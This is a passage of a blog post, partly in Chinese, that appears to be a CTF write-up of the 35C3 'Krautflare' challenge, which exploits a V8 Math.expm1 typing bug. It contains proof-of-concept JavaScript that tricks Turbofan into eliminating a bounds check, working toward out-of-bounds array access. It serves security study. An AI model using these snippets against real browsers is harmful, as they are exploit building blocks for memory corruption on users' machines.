<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.0.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fdlucifer.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":null,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="1Minus zero behaves like zero, right?  喜欢浏览器漏洞利用。是破坏了我认为是每天运行的最复杂的软件之一. 在35C3 CTF 今年(和KJC + mhackeroni一起比赛，获得了第一名!) 这有一个Chrome挑战关于利用一个v8漏洞, Chrome的 JavaScript引擎. 这个错误在静态分析期间导致了不正确的输入, 在即时编译的代码中产生不正确的优">
<meta property="og:type" content="article">
<meta property="og:title" content="利用V8中的Math-expm1-typing漏洞">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="1Minus zero behaves like zero, right?  喜欢浏览器漏洞利用。是破坏了我认为是每天运行的最复杂的软件之一. 在35C3 CTF 今年(和KJC + mhackeroni一起比赛，获得了第一名!) 这有一个Chrome挑战关于利用一个v8漏洞, Chrome的 JavaScript引擎. 这个错误在静态分析期间导致了不正确的输入, 在即时编译的代码中产生不正确的优">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v81.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v82.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v83.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v84.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v85.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v86.png">
<meta property="article:published_time" content="2021-02-15T07:39:59.000Z">
<meta property="article:modified_time" content="2021-02-15T13:11:06.919Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v8.png">

<link rel="canonical" href="https://fdlucifer.github.io/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>利用V8中的Math-expm1-typing漏洞 | lUc1f3r11's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lUc1f3r11's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">39</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">29</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">131</span></a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lucifer11.jpg">
      <meta itemprop="name" content="lUc1f3r11">
      <meta itemprop="description" content="all things about infosec & ctf">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          利用V8中的Math-expm1-typing漏洞
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-02-15 15:39:59 / Modified: 21:11:06" itemprop="dateCreated datePublished" datetime="2021-02-15T15:39:59+08:00">2021-02-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>27k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>25 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Minus zero behaves like zero, right?</span><br></pre></td></tr></table></figure>

<p>喜欢浏览器漏洞利用。是破坏了我认为是每天运行的最复杂的软件之一. 在<span class="exturl" data-url="aHR0cHM6Ly9jdGZ0aW1lLm9yZy9ldmVudC83MTg=">35C3 CTF<i class="fa fa-external-link-alt"></i></span> 今年(和KJC + mhackeroni一起比赛，获得了第一名!) 这有一个Chrome挑战关于利用一个v8<span class="exturl" data-url="aHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTE3MTA=">漏洞<i class="fa fa-external-link-alt"></i></span>, Chrome的 JavaScript引擎. 这个错误在静态分析期间导致了不正确的输入, 在即时编译的代码中产生不正确的优化. 这真的很难触发: 没能在CTF中及时完成, 但我觉得很多人会对一篇完整的WRITEUP感兴趣. <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9fdHN1cm8=">@_tsuro<i class="fa fa-external-link-alt"></i></span>感谢你一开始就找到了漏洞，也感谢你所面临的巨大挑战, 还有ESPR的精彩CTF!</p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Krautflare的员工是无服务器计算领域的最新突破。由于非常重视安全性，甚至将客户的工作负载相互隔离!</span><br><span class="line"></span><br><span class="line">在演示中, 添加了一个古老的v8漏洞，以表明它是不可利用的! 移步https://bugs.chromium.org/p/project-zero/issues/detail?id=1710 查看细节. 幸运的是，这是v8的最后一个漏洞，从现在起产品将是安全的.</span><br><span class="line"></span><br><span class="line">文件在: https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar</span><br><span class="line"></span><br><span class="line">挑战在: nc 35.246.172.142 1</span><br><span class="line"></span><br><span class="line">注释: 这个挑战很难! 它是为有的人在pwnable上要求的, 在这个推文中: https://twitter.com/_tsuro/status/1057676059586560000. 尽管上面链接的错误给了一个如何利用它的粗略的演练，只需要找出细节。希望你在编译器讲座上注意了:)。祝好运，已经警告过你了!</span><br></pre></td></tr></table></figure>

<h2 id="The-bug"><a href="#The-bug" class="headerlink" title="The bug"></a>The bug</h2><p>浏览一下bug报告，它给出了一个粗略的演练，并尝试解析它。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该类型设置Math.expm1为Union(PlainNumber, NaN)。这缺少了-0 的情况: Math.expm1(-0) 返回 -0。</span><br></pre></td></tr></table></figure>

<p>现代的JS引擎，如V8，对JS代码执行即时(JIT)编译，也就是说，它们将JavaScript转换为本机代码，以便更快地执行。在点火解释器执行一个函数多次后，该代码被标记为热路径，并由Turbofan JIT编译器编译。显然，我们希望尽可能地优化代码。因此，V8的优化管道大量使用了静态分析。感兴趣的最重要的属性之一是类型: 由于JavaScript是一种非常动态的语言，知道在运行时可以看到什么类型对于优化是至关重要的。</p>
<p>分析管道的一个组件是类型。它的作用是处理代码的中间表示中的节点，并根据可能的输入类型计算可能的输出类型。例如，一个常见的类型是range: 如果一个节点输出range(1,3)，这意味着它可以有1、2或3的值。</p>
<p>在本例中，输入器表示Math.expm1的类型函数总是Union(PlainNumber, NaN) (see buggy <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci90eXBlci5jYz9yY2w9OTY4MDMzOGM2MjJkNDY5M2Y5ODRiNDlmYjI0ZDEwMWFjZDJkODExMiZsPTE0Mzc=">typer.cc<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci9vcGVyYXRpb24tdHlwZXIuY2M/cmNsPTk2ODAzMzhjNjIyZDQ2OTNmOTg0YjQ5ZmIyNGQxMDFhY2QyZDgxMTImbD00MjA=">operation-typer.cc<i class="fa fa-external-link-alt"></i></span>). 这意味着输出要么是一个纯数字，要么是一个浮点NaN。plain - number类型表示除-0之外的任何浮点数。是的，浮点数有一个 - 0。然而，在运行时，Math.expm(-0)恰好是-0。因此，typer对类型做出了错误的假设。这种类型将传播到其他操作: 也许可以从中得到一个与安全相关的错误优化。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现可以区分0和-0的有趣案例是除法，atan2和Object.is。在前两种情况中，输入代码不处理负0，因此只剩下Object.is。</span><br></pre></td></tr></table></figure>

<p>下一个自然的问题是: -0在哪里会产生影响? 基本上，唯一有趣的情况是Object.is(Math.expm1(-0)， -0)。如果检查一下数学的结果。expm1是-0，输入者认为答案总是假的，但它在运行时可能为真或假。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">事实上，这个typer运行了3次:</span><br><span class="line"></span><br><span class="line">1. 在typer阶段</span><br><span class="line">2. 在TypeNarrowingReducer(负载消除阶段)</span><br><span class="line">3. 在简化的降低阶段</span><br><span class="line"></span><br><span class="line">在前两次输入运行之后，ConstantFoldingReducer将运行，所以如果让输入者标记对象。is result始终为<span class="literal">false</span>此时，它将被替换为一个假常数。这就剩下第三轮typing了。</span><br></pre></td></tr></table></figure>

<p>好吧，这里有一堆V8内部组件: 稍后再看。主要的一点是，该类型在管道中有多次运行，其间穿插着各种优化过程。如果typer过早发现在比较数学。expm1到-0，它只是将比较折叠成一个假常数(这并不完全发生在ConstantFoldingReducer中，稍后会更好地看到它)。这对我们来说是没有用的: 从功能的角度来看，代码是不正确的，但没有安全问题。另一方面，不想让输入器太晚发现-0比较，否则就不会得到正在寻找的错误优化。在我看来，这是整个行动的关键所在。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象。此时，is调用可以用两种形式表示。作为ObjectIsMinusZero节点，如果先前的pass知道比较-0或作为SameValue节点。ObjectIsMinusZero的情况似乎并不有趣，因为类型信息没有在UpdateFeedbackType函数中传播。相同值的反馈类型会被传播，并且会被用于范围计算(现在有bug)。</span><br></pre></td></tr></table></figure>

<p>The Object.is call starts as a SameValue node in intermediate representation. In a pass known as TypedOptimization, the SameValue node can be reduced to more specialized nodes (see ReduceSameValue in <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci90eXBlZC1vcHRpbWl6YXRpb24uY2M/cmNsPWRkZTI1ODcyZjU4OTUxYmIwMTQ4Y2Y0M2Q2YTUwNGFiMmYyODA0ODUmbD01MDQ=">typed-optimization.cc<i class="fa fa-external-link-alt"></i></span>). In our case, since we’re comparing something (the Math.expm1 result) with -0, TypedOptimization will replace SameValue with the specialized ObjectIsMinusZero. Looking a bit into the future, the typing pass where we’ll do damage is SimplifiedLowering (<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci9zaW1wbGlmaWVkLWxvd2VyaW5nLmNjP3JjbD1kZGUyNTg3MmY1ODk1MWJiMDE0OGNmNDNkNmE1MDRhYjJmMjgwNDg1Jmw9MzA3OQ==">simplified-lowering.cc<i class="fa fa-external-link-alt"></i></span>). That’s the third (and last) typing in the pipeline, and it does propagate type information for SameValue nodes, but not for specialized ObjectIsMinusZero nodes. We need type propagation to cause an incorrect optimization, so we want to avoid conversion to ObjectIsMinusZero: like above, we don’t want the optimizer to figure out too soon we’re comparing with -0.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">However, there’s one more obstacle you need to overcome. Using the naive approach, there will be a FloatExpm1 node <span class="keyword">in</span> the graph. This node outputs a <span class="built_in">float</span> and the SameValue node wants a pointer as input, so the compiler will insert a ChangeFloat64ToTagged node <span class="keyword">for</span> conversion. Since the <span class="built_in">type</span> information say that the input can never be -0, it will not include special minus zero handling and our -0 will get truncated to a regular 0.</span><br></pre></td></tr></table></figure>

<p>The Math.expm1 operation will be lowered to a FloatExpm1 node, which takes a float as input and outputs a float, which becomes an input to SameValue. However, there are two possible ways to represent a float: as a “raw” float, or as a tagged value (which can represent either a float or an object). FloatExpm1 outputs a raw float, but SameValue takes a tagged value (since it can accept all kinds of objects). Therefore, the compiler inserts a ChangeFloat64ToTagged node to convert from raw float to tagged value. Since the compiler thinks the input to ChangeFloat64ToTagged can never be -0, it won’t produce code to handle -0. At runtime, the -0 from Math.expm1 will get truncated to 0, ruining our efforts. Sounds like a deal breaker…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">However, it’s possible to make this a Call node instead, <span class="built_in">which</span> will <span class="built_in">return</span> a tagged value and the conversion does not happen.</span><br></pre></td></tr></table></figure>

<p>FloatExpm1 only accepts floats, but if you try to calculate Math.expm1(“0”) (passing a string), you get NaN, not some kind of error. So there must be a way for it to accept non-number arguments. The answer is that V8 includes a builtin implementation of Math.expm1, capable of dealing with all input types. If we can force Turbofan to call the builtin instead of using FloatExpm1, we get a Call node. The difference is that Call already returns a tagged value, so there’s no need for ChangeFloat64ToTagged and -0 won’t get truncated to 0.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Afterwards you can use the result <span class="keyword">for</span> the usual CheckBounds elimination and OOB RW <span class="keyword">in</span> a javascript array.</span><br></pre></td></tr></table></figure>

<p>This is the incorrect optimization we’re looking for. JavaScript array accesses are guarded by CheckBounds nodes, which ensure that the index falls within the array bounds. If the optimizer can determine statically that the index is always in-bounds, it can eliminate the CheckBounds node. Image tying the index to the result of Object.is: since the typing information is off, we could make the analyzer think the index is always in-bounds, while it can be out-of-bounds at runtime. The optimizer will incorrectly eliminate CheckBounds, giving us OOB access to a JS array, which we can use to construct more powerful exploitation primitives.</p>
<h2 id="Reproducing-the-bug"><a href="#Reproducing-the-bug" class="headerlink" title="Reproducing the bug"></a>Reproducing the bug</h2><p>This is the PoC from the bug report:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">foo</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> Object.is(Math.expm1(-0), -0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(foo());</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">console.log(foo());</span><br></pre></td></tr></table></figure>

<p>This has to be run with d8 –allow-natives-syntax. The first print will output true: the code is interpreted and does the right thing. Then, we optimize foo and the output changes to false: the optimizer used the incorrect typing information and folded Object.is into a constant false.</p>
<p>Problem is, when we try this PoC in the challenge’s d8, it doesn’t work: the second print is still true. We can use Turbolizer (v8/tools/turbolizer) to visualize the Turbofan IR at each optimization stage and figure out what’s happening. By passing –trace-turbo to d8, it will produce trace files which can be imported in Turbolizer. We’ll select the “simplified lowering” stage (that’s the last one we’re interested in), click on the T to show types, then on the four expanding arrows to show all nodes, then on the circular arrow to lay them out.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v8.png"></li>
</ul>
<p>From this portion of the graph, we see what we’re expecting: A FloatExpm1 node, which goes into NumberIsMinusZero, which is then returned (after conversion to tagged). The type for FloatExpm1 is Number, which includes -0. Isn’t it supposed to be PlainNumber or NaN? What’s happening? The reason is found in the revert-bugfix-880207.patch file, which re-introduces the bug. It only patches typer.cc, not operation-typer.cc: therefore, the bug is only present on a Call to the builtin, not on FloatExpm1. We need to produce a Call anyway, so let’s get to work on that.</p>
<p>FloatExpm1 is an optimized node for number inputs: the compiler speculates that the input will be a number. If it really is a number at runtime, great, it will keep executing optimized code. If it’s not a number, the optimized function will bail out to the interpreter: this process is known as deoptimization. The interpreter will use the builtin, which can accept all types. The next time the function is compiled, Turbofan has feedback information informing it that the input is not always a number, and will produce a Call to the builtin instead of FloatExpm1.</p>
<p>Let’s do exactly that. I will use loops to trigger compilation instead of the natives syntax, since we won’t have it when actually running the exploit.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x) &#123;</span><br><span class="line">    <span class="built_in">return</span> Object.is(Math.expm1(x), -0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(0);</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">let</span> i = 0; i &lt; 100000; i++)</span><br><span class="line">    foo(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">console.log(foo(-0));</span><br></pre></td></tr></table></figure>

<p>This will print false. When running it, you’ll notice that the function is now compiled two times. You can add the –trace-deopt flag to be informed about deoptimizations. At first, foo will be interpreted. After a while, it gets compiled and optimistically optimized assuming x is a number. The first time the compiled function is called (with x as a string), we get a deoptimization:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">;;; deoptimize at &lt;poc2.js:2:27&gt;, not a Number or Oddball</span><br><span class="line">[...]</span><br><span class="line">Feedback updated from deoptimization at &lt;poc2.js:2:27&gt;, not a Number or Oddball</span><br></pre></td></tr></table></figure>

<p>It’s updating type feedback, telling Turbofan to not assume x is a number. The second time the function is compiled, Turbofan will generate a Call to the builtin. You’ll see you now have two Turbolizer traces. The most recent shows a Call node with type PlainNumber or NaN, as we expect.</p>
<p>You might ask what’s the purpose of foo(0) at the beginning. To be honest, I have not yet figured it out completely: one might think it’s needed to provide number feedback, but you can move it even after the console.log and it will still work (Turbofan is optimistic by default in this case). However, if you remove it, it won’t work anymore. I believe it is related to some inlining of foo in the main body, but I’d definitely like to know more about this. Hit me up if you have any idea!</p>
<p>We have reproduced the bug. Next step: get OOB on a JS array.</p>
<h2 id="Triggering-an-OOB-access"><a href="#Triggering-an-OOB-access" class="headerlink" title="Triggering an OOB access"></a>Triggering an OOB access</h2><p>As stated before, the idea is to make the array index depend on the result of Object.is, so that the analyzer will assume the index is always in-bounds. For example, let’s consider this foo:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x) &#123;</span><br><span class="line">    <span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    <span class="built_in">let</span> b = Object.is(Math.expm1(x), -0);</span><br><span class="line">    <span class="built_in">return</span> a[b * 1337];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We’re attempting a read OOB, just because it’s easy to see when we get it. By using an assignment it can trivially become a write OOB. If b is false, we access index 0: the optimizer can determine this is in-bounds statically, since the length of a is known. If b is true, we access index 1337, which is out-of-bounds. The optimizer thinks b can only be false, so it’ll eliminate the bounds check. I won’t waste time on this example: it’s clear that b will be folded to a constant false (just like in the PoC), so we’ll always access index 0.</p>
<p>We could add indirection by making -0 a parameter:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x, y) &#123;</span><br><span class="line">    <span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    <span class="built_in">let</span> b = Object.is(Math.expm1(x), y);</span><br><span class="line">    <span class="built_in">return</span> a[b * 1337];</span><br><span class="line">&#125;</span><br><span class="line">// Update all uses of foo(...) to foo(..., -0)</span><br></pre></td></tr></table></figure>

<p>This time we get undefined back, and:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;;; deoptimize at &lt;poc3.js:4:13&gt;, out of bounds</span><br></pre></td></tr></table></figure>

<p>It’s not folding anymore, but it’s not removing the bounds check. Let’s check with Turbolizer (simplified lowering).</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v81.png"></li>
</ul>
<p>We are keeping a SameValue node, but it is being typed as Boolean instead of a singleton false. That means the analyzer thinks it can be either true or false. This propagates, giving us a Range(0, 1337) for the index, which clearly won’t allow a bounds check elimination. Going backwards, we find y as a Parameter[2] node, with NotInternal type. This means the analyzer has no idea of the type of y, specifically, it doesn’t know it’s always -0.</p>
<p>At this point, I decided to get methodical. Let’s study the Turbofan pipeline (see pipeline.cc) and find:</p>
<ul>
<li><p>The last stage in which folding of Object.is to false can happen: we don’t want the analyzer to know we’re comparing to -0 until after this.</p>
</li>
<li><p>The last stage in which typing happens: we want the analyzer to know we’re comparing with -0 before this, so that the information propagates.</p>
</li>
</ul>
<p>The last typing round is in the simplified lowering phase. Here’s the Turbofan optimization pipeline up to that point:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v82.png"></li>
</ul>
<p>Each phase has a lot of passes in it, on the right I reported some that are relevant to us, and I marked where typing passes happen.</p>
